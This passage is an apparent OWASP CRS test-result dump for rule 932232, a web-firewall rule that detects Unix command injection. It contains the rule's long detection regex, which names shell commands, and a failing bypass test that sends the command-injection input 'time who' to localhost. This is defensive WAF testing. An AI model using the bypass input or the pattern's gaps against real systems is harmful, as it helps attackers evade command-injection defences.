        "pattern" : "(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:(?:(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?2[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n|s)|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?f|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o|(?:[\\s\\x0b&\\),<>\\|]|$).*))\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932232
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932232",
    "test_id" : 5,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932232.yaml",
    "description" : "Remote Command Execution bypass with time",
    "cause" : "failed expect_id check: 932232 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Remote Command Execution bypass with time",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=time+who",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932232 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932232,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule targets pefix + commans that are prone to false positive detection at PL3."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932232.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932232"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:(?:(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?2[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n|s)|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?f|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o|(?:[\\s\\x0b&\\),<>\\|]|$).*))\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932232
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection"
        }, {
          "type" : "Action",
